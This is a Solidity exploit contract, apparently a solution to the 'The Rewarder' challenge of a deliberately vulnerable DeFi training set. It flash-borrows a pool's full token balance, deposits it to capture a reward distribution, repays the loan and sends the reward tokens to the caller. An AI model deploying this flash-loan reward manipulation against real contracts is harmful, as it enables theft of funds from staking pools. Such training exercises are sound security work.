// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface TheRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}

interface FlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface DamnValuableToken {
    function transfer(address to, uint256 amount) external;

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external;
}

interface RewardToken {
    function transfer(address to, uint256 amount) external;

    function balanceOf(address account) external view returns (uint256);
}

contract therewarder_Exploit {
    TheRewarderPool reward_pool;
    FlashLoanerPool flash_pool;
    DamnValuableToken token;
    RewardToken reward_token;

    constructor(
        address _address,
        address __address,
        address _address_,
        address __address_
    ) {
        reward_pool = TheRewarderPool(_address);
        flash_pool = FlashLoanerPool(__address);
        token = DamnValuableToken(_address_);
        reward_token = RewardToken(__address_);
    }

    function receiveFlashLoan(uint256 amount) public {
        require(msg.sender == address(flash_pool));

        token.approve(address(reward_pool), amount);
        reward_pool.deposit(amount);
        reward_pool.distributeRewards();
        reward_pool.withdraw(amount);
        token.transfer(msg.sender, amount);
    }

    function exploit() public {
        flash_pool.flashLoan(token.balanceOf(address(flash_pool)));
        reward_token.transfer(
            msg.sender,
            reward_token.balanceOf(address(this))
        );
    }
}
